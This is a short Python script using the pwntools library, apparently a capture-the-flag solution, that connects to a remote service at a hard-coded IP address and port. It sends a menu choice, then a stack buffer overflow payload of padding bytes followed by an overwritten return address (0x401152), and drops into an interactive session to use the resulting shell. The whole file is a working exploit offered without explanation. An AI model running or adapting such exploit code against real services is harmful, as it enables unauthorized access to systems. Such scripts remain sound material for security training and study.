from pwn import *
import time
import struct
import threading

# Connect to the remote service
p = remote('35.184.182.18', 32002)

# Function to receive and print messages from the server
def receive_messages():
    while True:
        try:
            # Receive a message from the server
            message = p.recv(timeout=1)
            if not message:
                break
            print(message.decode(), end='')  # Print the received message
        except EOFError:
            break
        except Exception as e:
            print(f"Error receiving message: {e}")
            break

# Start the message receiving in a separate thread
receive_thread = threading.Thread(target=receive_messages)
receive_thread.start()

# Send the first input
print("[*] Sending first input...")
p.sendline(b'1')  # Send the first input as bytes

# Wait a moment to ensure the service is ready for the next input
time.sleep(1)

# Prepare the payload
payload = b'A' * 50 + b'B' * 22 + struct.pack('<Q', 0x0000000000401152)

# Send the payload
print("[*] Sending payload...")
p.send(payload)

# Optional: Wait a little for the service to respond after sending the payload
time.sleep(1)

# Switch to interactive mode to interact with the shell or service
print("[*] Switching to interactive mode...")
p.interactive()

# Join the receiving thread when done
receive_thread.join()
